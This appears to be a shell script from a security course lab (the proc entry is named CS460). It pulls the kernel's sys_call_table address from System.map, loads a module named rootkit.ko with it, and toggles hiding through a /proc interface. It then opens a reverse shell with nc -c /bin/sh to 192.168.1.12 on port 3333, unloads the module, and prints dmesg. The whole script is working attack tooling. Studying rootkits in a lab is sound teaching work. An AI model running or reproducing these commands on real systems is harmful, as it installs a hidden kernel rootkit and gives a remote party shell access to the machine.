#/bin/sh

SYS_CALL_ADDR=$(cat /boot/System.map-$(uname -r)  | grep -w "sys_call_table" | cut -d" " -f1)

#echo $SYS_CALL_ADDR

insmod rootkit.ko sys_call_table_addr_input=${SYS_CALL_ADDR}

echo "hide" > /proc/CS460/status

echo "unhide" > /proc/CS460/status

/bin/nc.traditional -c /bin/sh 192.168.1.12 3333

rmmod rootkit

dmesg
